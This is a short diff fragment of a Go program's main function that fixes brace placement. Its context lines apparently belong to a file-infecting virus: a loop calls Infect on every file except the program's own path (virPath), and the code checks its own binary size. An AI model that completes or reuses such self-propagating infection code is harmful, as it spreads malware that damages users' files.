@@ -222,7 +222,8 @@ func main() {
                     if fPath != virPath {
                         Infect(fPath)
                 }
-            } 
+            }
+		}
     }
         
     if GetSz(os.Args[0]) > 2665472 {
@@ -230,5 +231,5 @@ func main() {
     } else {
         os.Exit(0)
     }
-  }
+	
 }
